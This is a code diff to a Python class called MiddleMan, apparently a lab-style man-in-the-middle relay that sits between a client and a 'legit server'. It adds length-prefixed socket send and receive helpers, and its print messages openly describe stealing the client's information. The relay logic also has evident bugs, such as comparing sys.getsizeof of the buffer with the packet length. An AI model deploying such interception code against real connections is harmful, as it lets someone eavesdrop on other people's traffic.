@@ -56,6 +56,34 @@ class MiddleMan:
             print("Connection Error %s" %msg)
             sys.exit(1)
 
+    def sendAllasServer(self,reqstr,connection,buffsize):
+        connection.send((len(reqstr)).to_bytes(4,'little'))
+        connection.send(reqstr)
+
+    def recieveAllasServer(self,connection,buffsize):
+        retdata = ""
+        cry = Crypt()
+        data = bytearray()
+        packetsize = connection.recv(4)
+        print(sys.getsizeof(data), int.from_bytes(packetsize,'little'))
+        while sys.getsizeof(data) < int.from_bytes(packetsize,'little'):
+            data.extend(connection.recv(self.getBUFFER_SIZE()))
+        return data
+
+    def sendAllasClient(self,reqstr,buffsize):
+        self.getSocketasClient().sendto((len(reqstr)).to_bytes(4,'little'),(self.getTCP_IP(), self.getTCP_ASCLIENT_PORT()))
+        self.getSocketasClient().sendto(reqstr,(self.getTCP_IP(), self.getTCP_ASCLIENT_PORT()))
+
+    def recieveAllasClient(self,buffsize):
+        retdata = ""
+        cry = Crypt()
+        data = bytearray()
+        packetsize = self.getSocketasClient().recv(4)
+        print(sys.getsizeof(data), int.from_bytes(packetsize,'little'))
+        while sys.getsizeof(data) < int.from_bytes(packetsize,'little'):
+            data.extend(self.getSocketasClient().recv(self.getBUFFER_SIZE()))
+        return data
+
     def getTCP_IP(self):
         return self.TCP_IP
 
@@ -96,7 +124,7 @@ class MiddleMan:
 
             else:
                 for conn in clients_allowed:
-                    data = conn.recv(self.getBUFFER_SIZE())
+                    data = self.recieveAllasServer(conn, self.getBUFFER_SIZE())
                     print(data)
                     if data:
                         print("Recieved request from 'client' haha")
@@ -104,11 +132,11 @@ class MiddleMan:
                         ret = self.e.send_err(error)
                         if error == 0:
                             print("stole client's information")
-                            self.getSocketasClient().sendto(data,(self.getTCP_IP(), self.getTCP_ASCLIENT_PORT()))
+                            self.sendAllasClient(data, self.getBUFFER_SIZE())
                             print("Request sent to legit server")
-                            data = self.getSocketasClient().recv(self.getBUFFER_SIZE())
+                            data = self.recieveAllasClient(self.getBUFFER_SIZE())
                             print("Got response from server")
-                            conn.sendto(data,(self.getTCP_IP(), self.getTCP_ASSERVER_PORT()))
+                            self.sendAllasServer(data, conn, self.getBUFFER_SIZE())
                             print("Sent server data to client")
 
                     else:
